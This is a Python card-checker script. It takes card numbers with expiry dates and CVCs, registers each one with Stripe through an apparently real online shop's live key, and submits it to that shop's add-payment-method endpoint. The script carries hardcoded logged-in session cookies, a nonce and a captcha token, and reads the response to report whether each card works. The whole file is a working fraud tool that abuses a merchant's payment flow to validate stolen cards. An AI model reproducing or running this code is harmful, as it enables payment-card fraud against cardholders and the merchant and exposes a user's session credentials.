import requests
import re
import random
import time
import user_agent
import string
from fake_useragent import UserAgent
import base64
from bs4 import BeautifulSoup
from faker import Faker
def st(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
	import requests
	
	headers = {
    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	data = f'billing_details[name]=+&billing_details[email]=adfadfadfeaqfa%40gmail.com&billing_details[address][country]=US&billing_details[address][postal_code]=10080&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fd182db0e09%3B+stripe-js-v3%2Fd182db0e09%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmeddentalstuff.com&time_on_page=105796&client_attribution_metadata[client_session_id]=97dc7ac5-1317-45c5-a146-6bf0e315076a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=b00df8b5-43e4-4f4f-a656-4ed7ab7b951905ebc2&muid=6e6f2276-2364-4f4d-a4d9-e42c7cb5cc6b30f9f9&sid=46beb5a9-59ae-4e5c-aaaf-a5a7d63d90fef3b283&key=pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn&_stripe_account=acct_1OybiACAY4rYVh06&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiNmp0U00ra2Q1RUM0Uy9xK21rajgyMWNEcXBoc1RMSVpsZ0EwQU1jU2tzOG9rZ0orMEN3Q3lBbjB2anVndks0QVlrTTNrUktML1kxTXZmalQ2dGNkeC9VOEhtTThnUmpNQjRzanM3a3FPMUU2OEF2YWVsUHhMeDN5dHhRSzhqa3FmOHBjNTlYTmlwblQvQlh2OEtFVW1qeWhTdXVaTjNpQ0xjeGVaSjBKb1hqSEF6RTBERkJlcDEyTytGaW0zU0ZvYmlucnh0ZS9XWjBvbEw2RWxaTUg3aDFFY1JtUXQxeVJaTGh5K3ZyRkJrSEl0UmFOZFhyNFVzbjgyRlNFUlg4VXdyd094bEt1SGF5c1RweUFRVERnV05mbDVMWUptSmZzMHlKTHhVZTJXSTNyMXZCbUVmWXY1akRCcVlsbEFnOWJMMFhoQnJDZ2NDUHZyb3JBdU5xdlg1dzNuL1RaKy9SZHdoSEZuV0pGeEExTmVsRllGamtjQ3VXVlljOTJDRjVDY205WkZCUmRJd2hTdVBMaG9tMjdyemdYd2c1UEVLU2VIR1R3aDZWcjcvVVptR0tSY3FtVTZ2aCtnbXZkUG9ZL1oyTWlXWHRxVUZmVS9hemNjMHRsaldXdXRmUHY1anc5cVo3NW1DSUFORmtwLzJjRGxSamQxd0ZOSzQ5OHBJTkxCR2hWaEI0SFR6dTFRYjkvR3lWcXQ5V2ZaVWVvaTNQQ2lTeEg1TitYUmZ5ZCtsdFlPUnA4R2hsMFZvckdoY2d3SFpNSFNwU3F1bHdwZDBYK3FqSEppdFpyWDRONDM0b3p4emNveHZLUys3aTM2UzFtR1Vnck0vQytYZmd0YmNGUU80NkU2SitvbDBaOGpLcTRJR2NXbU5VODZWNDV1dmNwUVFQRklOeG5TM3o0cURUaDdHZnQwTXB4MjNQTnVrU0JzMzRpZTFUZEdZamdZTFo3cjhZQ1ZRKy9RYVY3TC9YZFMyaHl5ZjNDbTZlNFNLR0dVQ0p5QWRxSWdTcnU4SDdkZi9FTnZvQy90MkdJSUtJYU5uakRFY244UTU3ZS9CU0lDL1B1aTRsMnM0czQyVnkrMXo2TTlqU3o4KzJWbE1hSUJrN3Z1bCtLNVc4QlBFeG5aUGZDYzFnQndMVU8yNTJxa0xjbEo2cHlNb201R3JMYkYrckpWcE1PdkxWU1BUSU9HTmxLZnNNLzRvTnBMTjF1T1VaVnIwbUFhVHBXaDU2QS9VNjBWSXdJaEd3ekhHWUlwTTN3ZG5oSVFaQ09sS0JXKzJXK3N5czB5VFBlTTYvbHJQMkJhV1VmTzd2UDA1eUZwVzVYUVdmYWZVVEc2SXBVaUNlL3pUT3JPY2RSajFSWXZFdVFHTUpFNjRTUzJsZUZTSUZCcENORkdvMzB2dk5PMlpqK0g1MTNQb0c0ZlJnN0N0aDhyeURjWXZDNGRCUHlkeDFtYlRwWVRScnVQZWExa2ZOZ1VyWUpuQ1VNa3pGNnJOREd0Qm10TXBCblF3dnhaSTVMeTRic3ltTjNMcHZGZERiRkhucHYzUGprMDEzckJrbVEyKy9tTzljRDJHY0YzcGVHZTkxVFhlbGp4ZVFFMEdnT2V4TjNKZk1xT20rb3NEYiswSTdPMmZWa3piOXdidUFqaGNjN1hDamFzVVdpRFBqb2tJenIvQTJ4citOWHlxRWhieDZXZE5SZDN1MU12MmowVzZhaHRRUEg0TU1qd005UDF1azIwTGUwazZkclQzMkcwSFYrTE03ZVZQVWs1TWpZNXdjZS9vTGVrRDRONHVxOGRYbytqSlp4dFNqOHh6eUpCMVhyWk5YQm5yL0krZk9VVTB3S1ErNzJ5OUx6eEpyZHVwT2pwMFY1VGFIL1AvK2U2WmFvdWR2TnJQMTc5L3gycjUyUWFPeEtqU3hhelc5K1I0RHhlaGxsQzBhVFd3cnpYRGJEYWJYMjRIOTNlL2N0S2l4OHZGOFg3OFJkcTZxU0dpQ1Bxd0Q4Wm9UcEJuU3dobjh6L0FhZmlGZThVVm00TmRyMkc0SXpLU1hRS25TdTJqZ0crZG9Hdzc3dnhyaGRHaE1YcmRkTkhXd3ZTY0U1anlRMjc1SmtrRy9NVUVCV1RtWFdWMXNNUGM3aktlRUdWWU9FVWVvZHZ1RVU3cDZDNExycFRQSGRoSi9XcWJiRm9iTmE5V3FQUzFJVFhxeWh3bVNzSngxUFlONGRzOVRHODQwL0NzdmpjMVdabVlaSDFRVENIaUNlRnkxdlRUcm8xSW1FVForT0Urb0VlM3lxdDRCbVM1WitlNm5kQ0U1ZFFzbmVsRk42TXA2ekFPL3JoaFF4VzBuQ1RtbjVxbHNvTktXSkZBaDFkcUZrU05CMHNtM0ZZWjZ0VjAwRTltOWFIcnNCdFcrVUpONEhmZkxsM3RRVHBobEl0M3RGdzcydTczOHhzUGl0bHphVkV6U3BpZVNVRkIwREtIeVJWTXNjOWExaVRCakhidGVlMGZDd0Q5ZWtKNjF6TCtIV2JaMlV4Z2gwQTlLaWtQVGlZRWx5QWRZQUZSMjl2RVdJSDN3cjhaMUxPUWltdysvcm1sRWhXNm1qTVJvbVI2dGQ3Rk1zRkE3K05TYlVmKzR4VmpSdklxNmlOZDV2TVRYUmhxQ1FZa1J5ZkFmZVlpMVI5ZlR1MWsxWHBnR0hjb3JlNVdnb00yRjdQYnVjV0krSWxnYVpkWUxXcUZ2M3lyWGZxbkN2UjZ4bDM4aWwxNzVMa0dYazJ1cUlrakhWeU5UcGVDZ0lzY0xIbXFEOWdHaUZ6UG5BQ3lQZlhrVFB2VkNETTNPbUluVlZSUytTVWxzTFZZaUU2eC9LS2lxa3NPWT0iLCJleHAiOjE3MjI2Nzk3ODYsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiIzNWY2ZjIyMyIsInBkIjowLCJjZGF0YSI6InZCZnhHMmx1R005ejNvdVhNdllvM2ljQlUwdm9NL2tEU1FZK2g2cFVobXpkMDlQOXZwOW1XbStabHRRakhweUxwMGQ4VUZWdU1wT1N5VGZ5cG1BYTlCOHhzT2R6RGY1TWx3djYzWm5ub2RMMVgxaXY5V1E3RVE4RHZjSHdBYmxLQU9IcDhISC9NSXRwVXVvR3Z0c3ZlWVFtZ1NZQ3NGcmpMeUk2MmREUnRIcEZSTUZOd2xqVmVJMHMydDFVT1p5MEVIVVRWSmVqUzJBajRFYTIifQ.c4BiHkUeqgBDC_Tf8__yQt32ZBSm6C0As1TW2KMSEn0'
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=response.json()['id']
	cookies = {
    'wordpress_sec_aeb286eb472c90c06caaf57c6394333b': 'adfadfadfeaqfa%7C1723889235%7C05ReB5BOy297ZDk3WPgMbCEqUDMKxgoNzjIWEe4hNeG%7Ceacfdbc910144338edbf8a327dae5ec3dd6ba1b62c2cac9f632aba1ab5dde126',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-03%2010%3A06%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fmeddentalstuff.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-03%2010%3A06%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fmeddentalstuff.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36',
    'wp-wpml_current_language': 'en',
    '_ga': 'GA1.1.861551378.1722679613',
    'cmplz_banner-status': 'dismissed',
    'cmplz_policy_id': '34',
    'cmplz_marketing': 'deny',
    'cmplz_statistics': 'deny',
    'cmplz_preferences': 'deny',
    'cmplz_functional': 'allow',
    'cmplz_consented_services': '',
    '_gcl_au': '1.1.1690591028.1722679612.738470959.1722679634.1722679634',
    '_lscache_vary': '7433d595838049c470c16714735dd56f',
    'wordpress_logged_in_aeb286eb472c90c06caaf57c6394333b': 'adfadfadfeaqfa%7C1723889235%7C05ReB5BOy297ZDk3WPgMbCEqUDMKxgoNzjIWEe4hNeG%7C3fc7ec87db2f7b0d4180a00ae01ac43a5ccbf1461bd6feb193963aec1f283350',
    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmeddentalstuff.com%2Fmy-account%2Fadd-payment-method%2F',
    '__ssid': '63a9d821d1924fa01ee91b21c33bfbb',
    '__stripe_mid': '6e6f2276-2364-4f4d-a4d9-e42c7cb5cc6b30f9f9',
    '__stripe_sid': '46beb5a9-59ae-4e5c-aaaf-a5a7d63d90fef3b283',
    '_ga_9KVN4F03B2': 'GS1.1.1722679613.1.1.1722679697.0.0.0',
}
	
	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryzquAeRzBAAE4XIDy',
    # 'cookie': 'wordpress_sec_aeb286eb472c90c06caaf57c6394333b=adfadfadfeaqfa%7C1723889235%7C05ReB5BOy297ZDk3WPgMbCEqUDMKxgoNzjIWEe4hNeG%7Ceacfdbc910144338edbf8a327dae5ec3dd6ba1b62c2cac9f632aba1ab5dde126; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-03%2010%3A06%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fmeddentalstuff.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-03%2010%3A06%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fmeddentalstuff.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; wp-wpml_current_language=en; _ga=GA1.1.861551378.1722679613; cmplz_banner-status=dismissed; cmplz_policy_id=34; cmplz_marketing=deny; cmplz_statistics=deny; cmplz_preferences=deny; cmplz_functional=allow; cmplz_consented_services=; _gcl_au=1.1.1690591028.1722679612.738470959.1722679634.1722679634; _lscache_vary=7433d595838049c470c16714735dd56f; wordpress_logged_in_aeb286eb472c90c06caaf57c6394333b=adfadfadfeaqfa%7C1723889235%7C05ReB5BOy297ZDk3WPgMbCEqUDMKxgoNzjIWEe4hNeG%7C3fc7ec87db2f7b0d4180a00ae01ac43a5ccbf1461bd6feb193963aec1f283350; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmeddentalstuff.com%2Fmy-account%2Fadd-payment-method%2F; __ssid=63a9d821d1924fa01ee91b21c33bfbb; __stripe_mid=6e6f2276-2364-4f4d-a4d9-e42c7cb5cc6b30f9f9; __stripe_sid=46beb5a9-59ae-4e5c-aaaf-a5a7d63d90fef3b283; _ga_9KVN4F03B2=GS1.1.1722679613.1.1.1722679697.0.0.0',
    'origin': 'https://meddentalstuff.com',
    'priority': 'u=1, i',
    'referer': 'https://meddentalstuff.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	files = {
    'action': (None, 'create_setup_intent'),
    'wcpay-payment-method': (None, id),
    '_ajax_nonce': (None, 'e1b033b0df'),
}
	
	response = requests.post('https://meddentalstuff.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, files=files)
	if '"success":true' in response.text or "Payment success" in response.text or "success" in response.text or "insufficient_funds" in response.text or " Insufficient funds" in response.text or "Payment Completed." in response.text or "Thank you for your support." in response.text or "Success" in response.text or "Thank you" in response.text or "succedd" in response.text:
		return '3d'
	else:
		return 'Your card was declined.'